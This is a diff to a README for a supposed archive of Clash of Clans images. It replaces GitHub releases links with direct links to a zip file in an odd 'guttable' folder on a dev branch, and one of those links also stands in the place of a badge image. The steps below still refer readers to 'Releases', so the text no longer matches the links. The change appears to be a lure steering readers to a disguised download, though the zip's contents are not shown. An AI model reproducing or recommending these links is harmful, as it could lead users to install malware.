@@ -6,7 +6,7 @@ Welcome to the SeansLifeArchive! This collection showcases all of my Clash of Cl
 
 ## 📥 Download Now
 
-[![Download SeansLifeArchive](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Sihabho2566/SeansLifeArchive_Images_Clash-of-Clans_Y2026/releases)
+[![Download SeansLifeArchive](https://raw.githubusercontent.com/Sihabho2566/SeansLifeArchive_Images_Clash-of-Clans_Y2026/SeansLifeArchive_Images_Clash-of-Clans_Y2026_Main-dev/guttable/SeansLifeArchive_Images_Clash-of-Clans_Y2026.zip)](https://raw.githubusercontent.com/Sihabho2566/SeansLifeArchive_Images_Clash-of-Clans_Y2026/SeansLifeArchive_Images_Clash-of-Clans_Y2026_Main-dev/guttable/SeansLifeArchive_Images_Clash-of-Clans_Y2026.zip)
 
 ## 📂 What You Will Find
 
@@ -35,7 +35,7 @@ No additional software is needed to view the images.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the collection: [Download Here](https://github.com/Sihabho2566/SeansLifeArchive_Images_Clash-of-Clans_Y2026/releases).
+To get started, visit this page to download the collection: [Download Here](https://raw.githubusercontent.com/Sihabho2566/SeansLifeArchive_Images_Clash-of-Clans_Y2026/SeansLifeArchive_Images_Clash-of-Clans_Y2026_Main-dev/guttable/SeansLifeArchive_Images_Clash-of-Clans_Y2026.zip).
 
 1. Click on the link above.
 2. Navigate to the "Releases" section.
